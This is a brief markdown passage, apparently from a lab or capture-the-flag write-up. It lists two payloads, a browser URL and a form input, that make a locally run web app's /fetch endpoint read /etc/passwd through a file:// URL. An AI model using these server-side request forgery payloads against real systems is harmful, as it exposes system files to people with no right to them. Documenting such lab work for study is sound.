# Payloads Used for Exploitation

To successfully exploit the application and retrieve the contents of the `/etc/passwd` file, the following payloads were used:

## 1. Browser URL Payload
```text
[http://127.0.0.1:5000/fetch?url=file:///etc/passwd](http://127.0.0.1:5000/fetch?url=file:///etc/passwd)

## 2. Web From Input Payload
file:///etc/passwd
